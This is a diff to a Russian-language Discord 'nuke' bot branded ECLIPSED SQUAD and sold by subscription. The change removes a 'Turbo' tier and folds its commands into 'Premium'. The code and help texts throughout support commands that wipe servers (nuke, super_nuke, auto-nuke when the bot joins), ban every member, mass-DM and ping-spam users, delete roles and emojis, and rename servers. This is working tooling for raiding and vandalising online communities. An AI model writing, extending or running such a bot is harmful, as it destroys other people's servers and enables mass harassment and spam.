@@ -72,9 +72,6 @@ def is_premium(user_id):
     return user_id in PREMIUM_LIST
 
 
-def is_turbo(user_id):
-    return user_id in TURBO_LIST
-
 
 def save_whitelist():
     asyncio.create_task(db_set("data", "whitelist", config.WHITELIST))
@@ -88,19 +85,11 @@ def save_premium():
     asyncio.create_task(db_set("data", "premium", PREMIUM_LIST))
 
 
-def save_turbo():
-    asyncio.create_task(db_set("data", "turbo", TURBO_LIST))
-
-
 def load_whitelist():
     pass  # заменено на async load в on_ready
 
 
 def load_premium():
-    pass  # заменено на async load в on_ready
-
-
-def load_turbo():
     pass  # заменено на async load в on_ready
 
 
@@ -117,7 +106,6 @@ def load_spam_text():
 
 BLOCKED_GUILDS: list[int] = []
 PREMIUM_LIST: list[int] = []
-TURBO_LIST: list[int] = []
 
 
 def save_blocked_guilds():
@@ -581,9 +569,11 @@ async def pm_add(ctx, user_id: int):
     if user_id not in PREMIUM_LIST:
         PREMIUM_LIST.append(user_id)
         save_premium()
-        await ctx.send(f"💎 `{user_id}` получил **Premium** — кастомный текст для `!nuke` разблокирован.")
-    else:
-        await ctx.send("Уже в Premium.")
+    # Автоматически добавляем в whitelist
+    if user_id not in config.WHITELIST:
+        config.WHITELIST.append(user_id)
+        save_whitelist()
+    await ctx.send(f"💎 `{user_id}` получил **Premium** + добавлен в **Whitelist**.")
 
 
 @bot.command(name="pm_remove")
@@ -593,35 +583,9 @@ async def pm_remove(ctx, user_id: int):
     if user_id in PREMIUM_LIST:
         PREMIUM_LIST.remove(user_id)
         save_premium()
-        await ctx.send(f"✅ `{user_id}` убран из Premium.")
+        await ctx.send(f"✅ `{user_id}` убран из Premium. Whitelist не тронут.")
     else:
         await ctx.send("Не найден в Premium.")
-
-
-# ─── OWNER-ONLY: TURBO ─────────────────────────────────────
-
-@bot.command(name="turbo_add")
-async def turbo_add(ctx, user_id: int):
-    if ctx.author.id != config.OWNER_ID:
-        return
-    if user_id not in TURBO_LIST:
-        TURBO_LIST.append(user_id)
-        save_turbo()
-        await ctx.send(f"⚡ `{user_id}` получил **Turbo** — доступ к `!superpr_nuke` и `!auto_superpr_nuke`.")
-    else:
-        await ctx.send("Уже в Turbo.")
-
-
-@bot.command(name="turbo_remove")
-async def turbo_remove(ctx, user_id: int):
-    if ctx.author.id != config.OWNER_ID:
-        return
-    if user_id in TURBO_LIST:
-        TURBO_LIST.remove(user_id)
-        save_turbo()
-        await ctx.send(f"✅ `{user_id}` убран из Turbo.")
-    else:
-        await ctx.send("Не найден в Turbo.")
 
 
 @bot.command(name="list")
@@ -640,9 +604,11 @@ async def list_cmd(ctx):
         return "\n".join(lines) if lines else "*пусто*"
 
     embed = discord.Embed(title="📋 Списки ECLIPSED", color=0x0a0a0a)
+    # Whitelist — только те кто не в Premium
+    wl_only = [uid for uid in config.WHITELIST if uid not in PREMIUM_LIST]
     embed.add_field(
-        name=f"✅ Whitelist ({len(config.WHITELIST)})",
-        value=await fmt(config.WHITELIST),
+        name=f"✅ Whitelist only ({len(wl_only)})",
+        value=await fmt(wl_only),
         inline=False
     )
     embed.add_field(
@@ -651,16 +617,10 @@ async def list_cmd(ctx):
         inline=False
     )
     embed.add_field(
-        name=f"⚡ Turbo ({len(TURBO_LIST)})",
-        value=await fmt(TURBO_LIST),
-        inline=False
-    )
-    embed.add_field(
         name="📌 Управление",
         value=(
             "`!wl_add <id>` / `!wl_remove <id>` — whitelist\n"
-            "`!pm_add <id>` / `!pm_remove <id>` — premium\n"
-            "`!turbo_add <id>` / `!turbo_remove <id>` — turbo"
+            "`!pm_add <id>` / `!pm_remove <id>` — premium (авто +whitelist)"
         ),
         inline=False
     )
@@ -669,32 +629,6 @@ async def list_cmd(ctx):
 
 
 # ─── PREMIUM COMMANDS ──────────────────────────────────────
-
-def turbo_check():
-    async def predicate(ctx):
-        if ctx.guild and is_guild_blocked(ctx.guild.id):
-            return False
-        if not is_whitelisted(ctx.author.id):
-            embed = discord.Embed(
-                title="☠️ ДОСТУП ЗАПРЕЩЁН",
-                description="У тебя нет подписки.\nЗа покупкой пиши в ЛС: **davaidkatt**",
-                color=0x0a0a0a
-            )
-            embed.set_footer(text="☠️ ECLIPSED SQUAD")
-            await ctx.send(embed=embed)
-            return False
-        if not is_turbo(ctx.author.id) and ctx.author.id != config.OWNER_ID:
-            embed = discord.Embed(
-                title="⚡ TURBO ФУНКЦИЯ",
-                description="Эта команда доступна только **Turbo** пользователям.\n\nЗа покупкой пиши в ЛС: **davaidkatt**",
-                color=0x0a0a0a
-            )
-            embed.set_footer(text="☠️ ECLIPSED SQUAD")
-            await ctx.send(embed=embed)
-            return False
-        return True
-    return commands.check(predicate)
-
 
 def premium_check():
     async def predicate(ctx):
@@ -744,7 +678,7 @@ async def super_nuke(ctx, *, text: str = None):
 
 
 @bot.command(name="superpr_nuke")
-@turbo_check()
+@premium_check()
 async def superpr_nuke(ctx, *, text: str = None):
     guild = ctx.guild
     if is_guild_blocked(guild.id):
@@ -1101,7 +1035,7 @@ def load_auto_superpr_nuke():
 
 
 @bot.command(name="auto_superpr_nuke")
-@turbo_check()
+@premium_check()
 async def auto_superpr_nuke_cmd(ctx, state: str, *, text: str = None):
     global AUTO_SUPERPR_NUKE, AUTO_SUPERPR_NUKE_TEXT
     if state.lower() == "on":
@@ -1292,19 +1226,17 @@ async def changelog(ctx):
         name="💀 v1.5 — Super Nuke",
         value=(
             "• `!super_nuke [текст]` — премиум нюк с приоритетами\n"
-            "• `!superpr_nuke [текст]` — turbo нюк, всё одновременно\n"
+            "• `!superpr_nuke [текст]` — premium нюк, всё одновременно\n"
             "• `!auto_super_nuke` — авто версия для premium\n"
-            "• `!auto_superpr_nuke` — авто версия для turbo\n"
-            "• **Turbo** список — `!turbo_add` / `!turbo_remove` / `!turbo_list`"
+            "• `!auto_superpr_nuke` — авто версия для premium"
         ),
         inline=False
     )
     embed.add_field(
-        name="⚡ v1.6 — Turbo & Auto Superpr Nuke",
+        name="⚡ v1.6 — Auto Superpr Nuke",
         value=(
-            "• **Turbo** список — `!turbo_add` / `!turbo_remove` / `!turbo_list`\n"
-            "• `!superpr_nuke [текст]` — turbo нюк, всё одновременно\n"
-            "• `!auto_superpr_nuke on/off/text/info` — авто turbo нюк при входе\n"
+            "• `!superpr_nuke [текст]` — premium нюк, всё одновременно\n"
+            "• `!auto_superpr_nuke on/off/text/info` — авто premium нюк при входе\n"
             "• Переименование сервера, каналов и ролей → **Привет от Detected and DavaidKa**\n"
             "• `!set_spam_text` теперь обновляет текст и для `auto_superpr_nuke`"
         ),
@@ -1385,6 +1317,8 @@ async def help_cmd(ctx):
         name="💎 PREMIUM",
         value=(
             "`!nuke [текст]` — нюк со своим текстом\n"
+            "`!super_nuke [текст]` — нюк с приоритетами\n"
+            "`!superpr_nuke [текст]` — нюк всё одновременно\n"
             "`!massban` — забанить всех участников\n"
             "`!massdm [текст]` — разослать ДМ всем\n"
             "`!spam [кол-во] [текст]` — спам в канал\n"
@@ -1393,7 +1327,8 @@ async def help_cmd(ctx):
             "`!emojisnuke` — удалить все эмодзи\n"
             "`!serverinfo` — подробная инфа о сервере\n"
             "`!userinfo [id]` — инфа о пользователе\n"
-            "`!auto_super_nuke on/off/text/info` — авто нюк+бан+роли+пинг при входе"
+            "`!auto_super_nuke on/off/text/info` — авто нюк при входе\n"
+            "`!auto_superpr_nuke on/off/text/info` — авто турбо нюк при входе"
         ),
         inline=False
     )
@@ -1480,10 +1415,13 @@ async def commands_premium(ctx):
         name="💀 УНИЧТОЖЕНИЕ",
         value=(
             "`!nuke [текст]` — нюк со своим текстом\n"
+            "`!super_nuke [текст]` — нюк с приоритетами\n"
+            "`!superpr_nuke [текст]` — нюк всё одновременно\n"
             "`!massban` — забанить всех участников\n"
             "`!rolesdelete` — удалить все роли\n"
             "`!emojisnuke` — удалить все эмодзи\n"
-            "`!auto_super_nuke on/off/text/info` — авто нюк+бан+роли+пинг при входе"
+            "`!auto_super_nuke on/off/text/info` — авто нюк при входе\n"
+            "`!auto_superpr_nuke on/off/text/info` — авто турбо нюк при входе"
         ),
         inline=False
     )
@@ -2470,7 +2408,7 @@ async def on_message(message):
 async def on_ready():
     global AUTO_SUPER_NUKE, AUTO_SUPER_NUKE_TEXT, SNUKE_CONFIG
     global AUTO_SUPERPR_NUKE, AUTO_SUPERPR_NUKE_TEXT
-    global BLOCKED_GUILDS, PREMIUM_LIST, TURBO_LIST
+    global BLOCKED_GUILDS, PREMIUM_LIST
 
     # ── Загрузка из MongoDB ──
     wl = await db_get("data", "whitelist")
@@ -2485,9 +2423,6 @@ async def on_ready():
     pm = await db_get("data", "premium")
     if pm is not None:
         PREMIUM_LIST = pm
-    tb = await db_get("data", "turbo")
-    if tb is not None:
-        TURBO_LIST = tb
     st = await db_get("data", "spam_text")
     if st is not None:
         config.SPAM_TEXT = st
@@ -2876,18 +2811,21 @@ async def on_ready():
         )
         if pm:
             embed.add_field(
-                name="� PREMIUM",
+                name="💎 PREMIUM",
                 value=(
                     "`!nuke [текст]` — нюк со своим текстом\n"
+                    "`!super_nuke [текст]` — нюк с приоритетами\n"
+                    "`!superpr_nuke [текст]` — нюк всё одновременно\n"
                     "`!massdm` `/massdm` — масс ДМ\n"
                     "`!massban` `/massban` — массбан\n"
+                    "`!spam` — спам в канал  |  `!pingspam` — пинг спам\n"
                     "`!rolesdelete` `/rolesdelete` — удалить роли\n"
                     "`!emojisnuke` `/emojisnuke` — удалить эмодзи\n"
                     "`!serverinfo` `/serverinfo` — инфо о сервере\n"
                     "`!userinfo` `/userinfo` — инфо о юзере\n"
-                    "`!spam` — спам в канал  |  `!pingspam` — пинг спам\n"
-                    "`!auto_super_nuke on/off/text/info` — авто супер нюк\n"
-                    "`!snuke_config` — настройка супер нюка"
+                    "`!auto_super_nuke on/off/text/info` — авто нюк при входе\n"
+                    "`!auto_superpr_nuke on/off/text/info` — авто турбо нюк при входе\n"
+                    "`!snuke_config` — настройка авто нюка"
                 ),
                 inline=False
             )
